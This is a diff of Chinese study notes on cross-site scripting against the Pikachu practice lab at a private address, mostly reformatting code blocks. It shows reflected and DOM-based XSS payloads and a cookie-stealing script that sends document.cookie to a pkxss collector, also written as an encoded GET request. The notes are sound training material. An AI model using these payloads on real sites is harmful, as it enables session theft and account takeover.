@@ -125,30 +125,29 @@ http://192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ea
 
 ```html
 <p class='con'><script>alert('xss')</script></p>
+<http://192.168.43.65/pikachu/vul/xss/xss_stored.php>
 ```
 
-```html
-http://192.168.43.65/pikachu/vul/xss/xss_stored.php
-```
 
 ### DOM型XSS
 
 [DOM举例](https://www.w3school.com.cn/tiy/t.asp?f=hdom_document_getbyid)
 
 ```html
-源码：<a href='"+str+"'>what do you see?</a>
-payload：#' onclick="alert('xss')"/>
-闭合：<a href='#' onclick="alert('xss')"/>'>what do you see?</a>
+<!--源码-->
+<a href='"+str+"'>what do you see?</a>
+<!--payload-->
+#' onclick="alert('xss')"/>
+<!--闭合-->
+<a href='#' onclick="alert('xss')"/>'>what do you see?</a>
 ```
 
 ### 案例1：GET型XSS获取cookie
 
 ```html
-# 注意pkxss的路径
+<!--注意pkxss的路径-->
 <script>document.location = 'http://192.168.43.65/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
-```
 
-```html
 192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=<script>document.location+%3D+'http%3A%2F%2F192.168.43.65%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D'+%2B+document.cookie%3B<%2Fscript>&submit=submit
 ```
 
